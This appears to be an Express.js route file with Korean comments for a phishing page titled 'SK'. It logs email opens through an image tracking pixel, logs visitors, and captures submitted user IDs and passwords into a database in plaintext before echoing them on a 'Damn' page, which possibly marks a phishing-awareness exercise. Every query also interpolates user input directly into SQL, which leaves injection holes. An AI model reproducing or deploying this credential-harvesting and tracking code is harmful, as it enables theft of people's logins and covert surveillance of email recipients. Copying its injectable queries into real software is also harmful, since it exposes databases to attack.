var express = require('express');
var router = express.Router();

var db = require('../middlewares/db');
var fs = require('fs');

/* GET home page. */
router.get('/', function(req, res, next) {
  const wantImg = req.query.img;
  const readUser = req.query.frame;

  if(wantImg==='Yes'){
    // 이미지 파일을 읽고 base64로 변환
    const imagePath = 'public/images/sk.png';
    const image = fs.readFileSync(imagePath);
    const base64Image = Buffer.from(image).toString('base64');

    var currentDate = new Date();
    var currentDateString = currentDate.toString();

    //이메일 열람한 사람
    db.query(`INSERT INTO viewMail VALUES ('${readUser}', '${currentDateString}')`,function(error, results){
      if(error){
        console.log(error);
        throw error;
      }
    })

    // "Content-Type" 헤더 설정 후 이미지 데이터 전달
    res.set('Content-Type', 'image/png');
    res.send(Buffer.from(base64Image, 'base64'));
  }else{

    //페이지 들어온사람
    db.query(`INSERT INTO inSite VALUES ('${readUser}', '${currentDateString}')`, function(error, results){
      if(error){
        console.log(error);
        throw error;
      }
    })
    //여기선 페이지를 보여주고 싶어
    res.render('index', { title: 'SK', user: `${readUser}`});
  }
});

router.post('/', function(req, res, next) {
  const readUser = req.query.frame;
  const id = req.body.id;
  const passwd = req.body.passwd.toString();

  var currentDate = new Date();
  var currentDateString = currentDate.toString();

  db.query(`INSERT INTO inData VALUES ('${readUser}', '${id}', '${passwd}', '${currentDateString}')`, function(error, results){
    if(error){
      console.log(error);
      throw error;
    }
  })

  res.render('Damn',{id: `${id}`, passwd: `${passwd}`});
})

module.exports = router;